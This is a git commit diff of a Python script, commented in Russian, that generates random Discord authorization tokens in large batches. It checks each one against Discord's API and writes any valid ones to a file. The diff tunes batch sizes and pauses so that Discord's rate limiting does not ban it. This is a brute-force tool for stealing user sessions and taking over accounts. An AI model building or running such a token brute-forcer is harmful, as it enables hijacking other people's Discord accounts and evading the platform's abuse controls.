e97add93af23b50d19012239203d26482b88ebb8
Sebsish <llki11er228ll@gmail.com>
2022-05-05 15:40:21 +0700

    worked with comments

--- main.py
+++ main.py
@@ -12,9 +12,11 @@ from plyer import notification
 
 # Если True, выводит в консоль все сгенерированные токены, если False, то только валидные
 # Отключение немного ускоряет работу скрипта 
-PRINT_ALL_TOKENS = True 
+PRINT_ALL_TOKENS = False 
 
-
+PACKETS_COUNT = 10 # сколько будет генерироваться пакетов с токенами, 0 для бесконечной работы.
+TOKENS_IN_PACKET = 1000 # сколько будет токенов в одном пакете запросов, рекомендуется 100-1000.
+TIMEOUT = 3 # время простоя между запросами пакетов в секундах, чтобы не забанил api дискорда, желательно ставить хотя бы 1 секунду
 
 tprint(f"TOKEN GENERATOR", font='modular')
 
@@ -31,29 +33,38 @@ def gen_third():
 def notify(title, message):
 	notification.notify(title = title, message = message,  app_icon="./nitro.ico")
 
+valid_tokens_count = 0
 url = "https://discordapp.com/api/v6/users/@me/library"
-
 async def check(token, session):
     async with session.get(url, headers={'Content-Type': 'application/json', 'authorization': token}) as res:
         if res.status != 200:
             if PRINT_ALL_TOKENS:
                 return f"{Fore.RED}{token} : INVALID{Fore.RESET}"
-            return "В пачке нет валидных токенов."
+            return f"{Fore.RED}В пачке нет валидных токенов...{Fore.RESET}"
         elif res.status == 200:
+            with open("Valid tokens.txt", "a") as file:
+                file.write(token)
+            valid_tokens_count += 1
             return f"{Fore.GREEN}{token} : VALID{Fore.RESET}"
+            
 
 async def main():
     async with aiohttp.ClientSession() as session:
-        for i in range(10):
+        # with open("Tokens.txt", "r") as file:
+        for i in range(100):
             tasks = []
-            for j in range(100):
+            # tokens = file.readlines()
+            for j in range(1000):
+                # token = tokens[j].removesuffix('\n')
                 token = f"{gen_first()}.{gen_second()}.{gen_third()}"
                 tasks.append(asyncio.ensure_future(check(token, session)))
             tokens = set(await asyncio.gather(*tasks))
             for token in tokens:
                 print(token)
+            await asyncio.sleep(5)
         
 if __name__ == "__main__":
     start_time = time.time()
     asyncio.get_event_loop().run_until_complete(main())
+    print("")
     print(f"{Fore.YELLOW}--- {time.time() - start_time} seconds ---{Fore.RESET}")
